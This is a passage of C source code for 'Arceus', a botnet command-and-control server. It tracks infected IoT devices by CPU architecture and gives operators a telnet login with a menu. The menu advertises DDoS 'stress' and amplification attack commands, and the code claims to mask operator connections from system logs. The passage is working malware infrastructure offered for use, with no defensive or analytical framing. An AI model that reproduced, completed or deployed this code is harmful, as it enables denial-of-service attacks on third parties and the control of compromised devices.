        free(wot); // Release Function From [wot]
}
void *epollEventLoop(void *useless) // Create Struct via EPOLL, Use Void Function To Call Event
{
  struct epoll_event event; // Create Struct via EPOLL, Use Void Function To Call Event
  struct epoll_event *events; // Create Struct via EPOLL, Use Void Function To Call Event
  int s; // Create Struct via EPOLL, Use Void Function To Call Event
  events = calloc(MAXFDS, sizeof event); // Create Struct via EPOLL, Use Void Function To Call Event
  while (1) // While == Wait 1 Second, This Is Stable
  {
    int n, i; // State 'i' And 'n'
    n = epoll_wait(epollFD, events, MAXFDS, -1); // Set 'n' With MAXFDS
    for (i = 0; i < n; i++) // 'n' && 'i' comp
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) // Show Device Input Via EPOLL
      {
        clients[events[i].data.fd].connected = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].arm = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].mips = 0;  // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].x86 = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].spc = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].ppc = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].sh4 = 0; // Our Devices -- More To Be Added -- Events Created Here
        close(events[i].data.fd); // Close Function
        continue; // Continue
      }
      else if (listenFD == events[i].data.fd) // Listen FD - For Events.
      {
        while (1) // While == Wait 1 Second, This Is Stable
        {
          struct sockaddr in_addr; // Create Struct For Sockaddress
          socklen_t in_len; // SOCK DEFINE
          int infd, ipIndex; // SOCK DEFINE

          in_len = sizeof in_addr;  // sock define
          infd = accept(listenFD, &in_addr, &in_len); // sock define
          if (infd == -1) // sock define
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break; // Error Validation
            else // Else
            {
              perror("accept"); // accept error handling
              break; // Terminate Process
            }
          }

        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr; // Show Clients Connected To Broadcast
        int dup = 0; // Value The DUPLICATES
        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) { // Create Index, IP
          if(!clients[ipIndex].connected || ipIndex == infd) continue; // Check Connected
          if(clients[ipIndex].ip == clients[infd].ip) { // Check Connected, IP
            dup = 1; // Dup Value == 1 [Faster]
            break;
          }}
          s = make_socket_non_blocking(infd);
          if (s == -1) { close(infd); break; }

          event.data.fd = infd; // Create Struct via EPOLL, Use Void Function To Call Event
          event.events = EPOLLIN | EPOLLET; // Create Struct via EPOLL, Use Void Function To Call Event
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event); // Create Struct via EPOLL, Use Void Function To Call Event
          if (s == -1) // 's' Value == -1 
          {
            perror("epoll_ctl"); // Epollctl Error Handling
            close(infd); // Kill infd
            break;
          }

          clients[infd].connected = 1; // I'm Getting Tired Of This..
          send(infd, "!* Arceus ON\n", 9, MSG_NOSIGNAL); // Send infd, Using Command Via Client.

        }
        continue; // Keep Going,...
      }
      else // What Else.. Smh...
      {
        int thefd = events[i].data.fd; // Unecessary To Comment, This Is Struct'in and Stating Integer.
        struct clientdata_t *client = &(clients[thefd]); // Unecessary To Comment, This Is Struct'in and Stating Integer.
        int done = 0; // Unecessary To Comment, This Is Struct'in and Stating Integer.
        client->connected = 1; // Our Devices -- More To Be Added -- Events Created Here
        client->arm = 0;  // Our Devices -- More To Be Added -- Events Created Here
        client->mips = 0; // Our Devices -- More To Be Added -- Events Created Here
        client->sh4 = 0; // Our Devices -- More To Be Added -- Events Created Here
        client->x86 = 0; // Our Devices -- More To Be Added -- Events Created Here
        client->spc = 0; // Our Devices -- More To Be Added -- Events Created Here
        client->ppc = 0; // Our Devices -- More To Be Added -- Events Created Here
        while (1) // While == Wait 1 Second, This Is Stable
        {
          ssize_t count; // State, SSize Count 
          char buf[2048]; // Char Buffer To [2048] - Although, This May Change As We Want A EXTREMELY Stable Client, Testing In Progress.
          memset(buf, 0, sizeof buf); // Fill In Data-Block, This Can Also Be Stated As The Buffer Off-set [0xA - 0xB]

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0) // Memset, Using The Stated Buffer-Size Value.
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; } // We Shall Break The Line, Stating This As Null.
            trim(buf); // Trim Buffer.
            if (strcmp(buf, "PING") == 0) { // Ping Is The Input Connection, Waiting For It's Response. This Has To Be Allocated.
              if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // PONG, Is The Response From Ping, This is The Allocation.
              continue; 
            } 
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mx86_64\e[1;37m] Loaded!") == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->x86 = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mx86_32\e[1;37m] Loaded!") == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->x86 = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mMIPS\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->mips = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mMPSL\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->mips = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mARM4\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mARM5\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mARM6\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mARM7\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mPPC\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->ppc = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mSPC\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->spc = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                                                if(strcmp(buf, "PING") == 0) { // Input Connection, Response Is Below
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // Response Line, PING/PONG Uses Strcmp
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) { // We use 'strcmp' To Compare Both Of Our Input And Output - [Response] Strings
                                                continue; } // This Is Then Used, To Output A Valid Integer
                                                printf("\"%s\"\n", buf); } // This Is The Output Here
 
                                        if (count == -1) // Error Value - [Show ERR]
                                        {
                                                if (errno != EAGAIN) // // Error Value - [Show ERR]
                                                {
                                                        done = 1; // Error Value
                                                }
                                                break;
                                        }
                                        else if (count == 0) // // Error Value - [Show ERR]
                                        {
                                                done = 1; // // Error Value - [Show ERR]
                                                break; // Break This Function. Terminate.
                                        }
                                }
 
                                if (done) // Only If Value, Is [Done] ( Equal To 0 )
                                {
                                        client->connected = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->arm = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->mips = 0;  // Display Our Devices, This Is One The Client Side. 
                                        client->sh4 = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->x86 = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->spc = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->ppc = 0; // Display Our Devices, This Is One The Client Side. 
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int armConnected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].arm) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
unsigned int mipsConnected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].mips) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int x86Connected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].x86) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int spcConnected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].spc) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
} 

unsigned int ppcConnected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].ppc) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int sh4Connected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].sh4) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int clientsConnected() // Create An Unsigned Integer, For Our Device
{
  int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
  for (i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
  {
    if (!clients[i].connected) continue; // Continue, After Device Statement.
    total++; // Total Device Value
  }

  return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

    void *titleWriter(void *sock) // We Shall Create A Window Title For The Screen
    {
        int thefd = (long int)sock; // Creating A 'Long' Integer, For Sock output
        char string[2048]; // Char Every Line For Output Communication
        while(1) // While == Wait 1 Second, This Is Stable
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; Arceus I | IoT Devices: %d | Administrators: %d %c", '\033', clientsConnected(), managesConnected, '\007'); // [Title]
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1); // Send Output Response
            sleep(2); // Sleep, So No Concurrent Processes Create Any Problems
        }
    }


int Search_in_File(char *str) // Char Every Line For Output Communication [Search In File]
{
  FILE *fp; // FILE*fp
  int line_num = 0; // Create Integer For Each Line Number
  int find_result = 0, find_line = 0; // Create Integer For Each Line Number
  char temp[512]; // Char [512]

  if ((fp = fopen("arceus.txt", "r")) == NULL) { // [Login.txt Output]
    return(-1); // Return Value
  }
  while (fgets(temp, 512, fp) != NULL) { // temp -- 512
    if ((strstr(temp, str)) != NULL) { // Constant Char Communication Between Unsigned_Integer.
      find_result++; // Finding Output Value
      find_line = line_num; // Find Line, Then Put Under Line_Numerical
    }
    line_num++; // Line Output -- Line Total
  }
  if (fp) // Check
    fclose(fp); // Kill

  if (find_result == 0)return 0; // Result Output

  return find_line;
}
void client_addr(struct sockaddr_in addr) { // Client Adress -- To Socket Adress
  printf("\e[38;5;202mIP\e[38;5;93m:[\e[38;5;202m%d.%d.%d.%d\e[38;5;93m]\n", // Display User IP Output
    addr.sin_addr.s_addr & 0xFF, // 0xFF --> + Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF00) >> 8, // 0xFF --> + Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF0000) >> 16, // 0xFF --> + Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF000000) >> 24); // 0xFF --> + Whatever Stated Value
  FILE *logFile; // Create IP Log
  logFile = fopen("logs/Arceus_IP.log", "a"); // Output The File
  fprintf(logFile, "\n\e[38;5;202mIP\e[38;5;93m:[\e[38;5;202m%d.%d.%d.%d\e[38;5;93m]", // IP Format, Via The Following.
    addr.sin_addr.s_addr & 0xFF, // 0xFF --> Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF00) >> 8, // 0xFF --> Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF0000) >> 16, // 0xFF --> Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF000000) >> 24); // 0xFF --> Whatever Stated Value
  fclose(logFile); // Close The Log File
}

void *telnetWorker(void *sock) { // Here Is Where The Magic Happens 
  int thefd = (int)sock; // Create Integer For Sock
  managesConnected++; // State Manages Connected
  int find_line; // Create Integer For Find Line Function
  pthread_t title; // Use pthread To Output Title
  char counter[2048]; // Char Every Line For Output Communication
  memset(counter, 0, 2048); // Fill Data Block - [2048]
  char buf[2048]; // Char Every Line For Output Communication
  char* nickstring; // Char Every Line For Output Communication
  char usernamez[80]; // Char Every Line For Output Communication
  char* password; // Char Every Line For Output Communication
  char *admin = "admin"; // Char Every Line For Output Communication 
  char *normal = "normal"; // Char Every Line For Output Communication
  memset(buf, 0, sizeof buf); // Fill Data Block - [buf]
  char botnet[2048];  // Char Every Line For Output Communication
  memset(botnet, 0, 2048); // Fill Data Block - [2048]

  FILE *fp; // Check
  int i = 0; // Create Integer For I
  int c; // Create Integer For C
  fp = fopen("arceus.txt", "r"); // format: user pass id (id is only need if admin user ex: user pass admin)
  while (!feof(fp)) // feof
  {
    c = fgetc(fp); // Define C to fget
    ++i; // Total Value Size
  }
  int j = 0; // Create Integer J
  rewind(fp); // Rewind [fp]
  while (j != i - 1) // Call Integer J
  {
        fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].id); // Displaying, User -- Pass, Through Specific Format
    ++j;
  }

  char Prompt_1 [500]; // Char Every Line For Output Communication
  sprintf(Prompt_1,  "                  \e[38;5;201m╔═════════════════════════════╗\r\n                  \e[38;5;201m║     \e[38;5;202mWelcome To Arceus I     \e[38;5;201m║\r\n                  \e[38;5;201m║ \e[38;5;202mPlease Enter your Username  \e[38;5;201m║\r\n                  \e[38;5;201m║ \e[38;5;202mIn the Login Prompt Below   \e[38;5;201m║\r\n                  \e[38;5;201m╚═════════════════════════════╝     \r\n              \e[38;5;201m╔═════════════════════════════════════╗\r\n              \e[38;5;201m║        \e[38;5;202mThis Source Code is          \e[38;5;201m║\r\n              \e[38;5;201m║     \e[38;5;202m Licensed under GPU V3.0        \e[38;5;201m║\r\n              \e[38;5;201m║  \e[38;5;202mFOR ALLOWED USE IN 'CYBER-WARFARE' \e[38;5;201m║\r\n              \e[38;5;201m╚═════════════════════════════════════╝\r\n");
  if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_1, strlen(Prompt_1), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  sprintf(botnet, "\e[38;5;201mUsername:\e[38;5;202m "); // Username Input
  if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if (fdgets(buf, sizeof buf, thefd) < 1) goto end; // Restate Buffer Size, If Output Is Released
  trim(buf); // Trim [Buffer]
  sprintf(usernamez, buf); // Use Data From 'Usernamez'
  nickstring = ("%s", buf); // Find String Input From User
  find_line = Search_in_File(nickstring); // We Search The User File

    if (strcmp(nickstring, accounts[find_line].user) == 0) { // Here Is Our Login System
    sprintf(botnet, "\e[38;5;202mLogging In As User: \e[38;5;201m%s\r\n", accounts[find_line].user, buf); // Find User, Via The Login File, This Is Dependent On User Input
    sprintf(botnet, "\e[38;5;202mPlease Enter Your Password!\r\n"); // Enter Password Display Output - This Is User Input
    sprintf(botnet, "\e[38;5;201mPassword: \e[38;5;202m"); // Enter Password - This Is User Input
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end; // Restate Buffer Size, If Output Is Released
    trim(buf); // Trim [Buffer]
    if (strcmp(buf, accounts[find_line].password) != 0) goto failed; // If No User, Is Found, Continue To 'Failed' Output
    memset(buf, 0, 2048); // Memset Data Block Fill, Just So We Are Stable
    goto Arceus; // Go To 'Arceus'
  }
    failed:
        pthread_create(&title, NULL, &titleWriter, sock);
        char failed_line1[5000]; // Char Every Line For Output Communication
        char failed_line2[5000]; // Char Every Line For Output Communication

        char clearscreen [5000]; // Char Every Line For Output Communication
        memset(clearscreen, 0, 2048); // Memset Data Block Fill, Just So We Are Stable
        sprintf(clearscreen, "\033[2J\033[1;1H"); // Clear Screen

        sprintf(failed_line1, "Login Error!\r\n");  // We are Attempting To Display FailedBanner!
        sprintf(failed_line2, "If you run into this issue please contact the owner!\r\n");  // We are Attempting To Display FailedBanner!


        sleep(1); // You Have Failed!
        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        sleep(3); // Sleep For 3 Seconds, Clean Exit
        goto end; // You Have Failed!
        if (send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        Arceus: // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        char start_1 [90000]; // Char Every Line For Output Communication
        char start_2 [90000]; // Char Every Line For Output Communication
        char start_3 [90000]; // Char Every Line For Output Communication
        char start_4 [90000]; // Char Every Line For Output Communication
        char start_7 [90000]; // Char Every Line For Output Communication
        char start_8 [90000]; // Char Every Line For Output Communication
        char start_9 [90000]; // Char Every Line For Output Communication
        char start_10 [90000]; // Char Every Line For Output Communication
        char start_12 [90000]; // Char Every Line For Output Communication
        char start_13 [90000]; // Char Every Line For Output Communication
        char Arceus_1 [90000]; // Char Every Line For Output Communication
    
        // clear
        sprintf(start_1,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mRemoving All Traces Of LD_Preload..\r\n"); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_2,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mFinished Removing ALL Traces Of LD_Preload!\r\n"); // Successful Connection, We Are Loading Into Arceus...
        // clear 
        sprintf(start_3,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mMasking Connection From utmp+wtmp...\r\n"); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_4,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mSucessfully Masked Connection! \r\n"); // Successful Connection, We Are Loading Into Arceus...
        // clear
        sprintf(start_7,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mLogging User Information..\r\n"); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_8,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mUser Information Successfully Logged!\r\n"); // Successful Connection, We Are Loading Into Arceus...
        // clear
        sprintf(start_9,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mWelcome \e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]\r\n", accounts[find_line].user, buf); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_10, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mYour Access Level Is \e[38;5;93m%s!\r\n", accounts[find_line].id, buf); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_12, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mLoading Arceus C2 Session.. \r\n"); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_13, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mArceus C2 Session Loaded! \r\n"); // Successful Connection, We Are Loading Into Arceus...
        //clear
        sprintf(Arceus_1,    "\e[38;5;201m╔════════════════════════════════════╗                ╔════════════════════════╗\r\n\e[38;5;201m║  \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mMain Menu \e[38;5;201m- \e[38;5;202mWelcome!   \e[38;5;201m║         ╔══════╣ \e[38;5;202mSuggested Port\e[38;5;201m: \e[38;5;202m62627  \e[38;5;201m║\r\n\e[38;5;201m╠════════════════════════════════════╣         ║      ║ \e[38;5;202mSuggested Psize\e[38;5;201m: \e[38;5;202m1460  \e[38;5;201m║\r\n\e[38;5;201m║    \e[38;5;202mWelcome to Project Arceus I     \e[38;5;201m╠═══╗     ║      ║ \e[38;5;202mSuggested Method\e[38;5;201m: \e[38;5;202mSTD  \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m This source is currently in beta  \e[38;5;201m║   ║   ╔═╩══╗   ║ \e[38;5;202mMax Attack time \e[38;5;201m- \e[38;5;202m300  \e[38;5;201m║\r\n\e[38;5;201m╚═══════════════╦════════════════════╝   ╚═══╣ \e[38;5;93m<3 \e[38;5;201m╠═╗ ╚════════════════════════╝\r\n\e[38;5;201m                ║ \e[38;5;93mFlexingOnLamers \e[38;5;202mx \e[38;5;93mJack   \e[38;5;201m  ╚════╝ ║\r\n\e[38;5;201m                ║ \e[38;5;93mTransmissional \e[38;5;202mx \e[38;5;93mZach    \e[38;5;201m         ║\r\n\e[38;5;201m╔═══════════════╩══════════════════╗                ║                   \r\n\e[38;5;201m║  \e[38;5;202mArceus I\e[38;5;201m - \e[38;5;202mCommand List \e[38;5;201m- \e[38;5;202mCMDs\e[38;5;201m  ║ ╔══════════════╩══════════════════════════╗\r\n\e[38;5;201m╠══════════════════════════════════╣ ║ \e[38;5;202mOS_System\e[38;5;201m:\e[38;5;202m CentOS \e[38;5;201m[\e[38;5;202m6\e[38;5;201m] - [\e[38;5;202m7\e[38;5;201m]             \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.help \e[38;5;201m- \e[38;5;202mFull List of Commands    \e[38;5;201m║ ║ \e[38;5;202mCCR:\e[38;5;202m XXX-223-389                        \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.stress\e[38;5;201m - \e[38;5;202mList of DDoS Commands  \e[38;5;201m╠═╣ \e[38;5;202mCIPHER\e[38;5;201m: \e[38;5;202mSHA-512 \e[38;5;201m,\e[38;5;202m AES-BYTE \e[38;5;201m, \e[38;5;202mCIPHER-TLS \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.logout \e[38;5;201m- \e[38;5;202mLogs out of the C2     \e[38;5;201m║ ║ \e[38;5;202mSTATE\e[38;5;201m: \e[38;5;202mPRIVATE                          \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.clear \e[38;5;201m- \e[38;5;202mClears screen           \e[38;5;201m║ ║ \e[38;5;202mOBJ-TYPE\e[38;5;201m:\e[38;5;202m C2 SOURCE X TELNET LAYER      \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.tools\e[38;5;201m - \e[38;5;202mList of available tools \e[38;5;201m║ ║ \e[38;5;202mLSC\e[38;5;201m: \e[38;5;202mGL3.0                              \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.iphm \e[38;5;201m- \e[38;5;202mAMP Attack Methods       \e[38;5;201m║ ║ \e[38;5;202mPRJ-VAS\e[38;5;201m: \e[38;5;202m6949-3853-9891                 \e[38;5;201m║\r\n\e[38;5;201m║ \e[38;5;202m.bots \e[38;5;201m- \e[38;5;202mDisplays Devices Online  \e[38;5;201m║ ║ \e[38;5;202mDESC\e[38;5;201m: \e[38;5;202mNET-WSS                           \e[38;5;201m║\r\n\e[38;5;201m╚══════════════════════════════════╝ ╚═════════════════════════════════════════╝\r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, start_1, strlen(start_1), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); 
        if(send(thefd, start_2, strlen(start_2), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        if(send(thefd, start_3, strlen(start_3), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); 
        if(send(thefd, start_4, strlen(start_4), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        if(send(thefd, start_7, strlen(start_7), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); 
        if(send(thefd, start_8, strlen(start_8), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_9, strlen(start_9), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); 
        if(send(thefd, start_10, strlen(start_10), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); // Clear Screen From Broadcast -- We Are Stable !
        if(send(thefd, start_12, strlen(start_12), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2);
        if(send(thefd, start_13, strlen(start_13), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (5);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Arceus_1, strlen(Arceus_1), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        while(1) 
        { // We are Displaying Attempting to display main banner!
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // We are Displaying Attempting to display main banner!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        break; // World Break!
        } // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        managements[thefd].connected = 1; // We are Displaying Attempting to display main banner!

      while(fdgets(buf, sizeof buf, thefd) > 0) // Buffer Size, Stated Less Than 0, This Allows Consistent Connection
      {
      if (strstr(buf, ".bots")) // Output For Command - '.bots'
      {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
      {
      char total[128]; // Char Every Line For Output Communication -- 128 byte
      char mips[128]; // Char Every Line For Output Communication
      char sh4[128]; // Char Every Line For Output Communication
      char arm[128]; // Char Every Line For Output Communication
      char ppc[128]; // Char Every Line For Output Communication
      char x86[128]; // Char Every Line For Output Communication
      char spc[128]; // Char Every Line For Output Communication
      char bot_1 [5000]; // Char Every Line For Output Communication
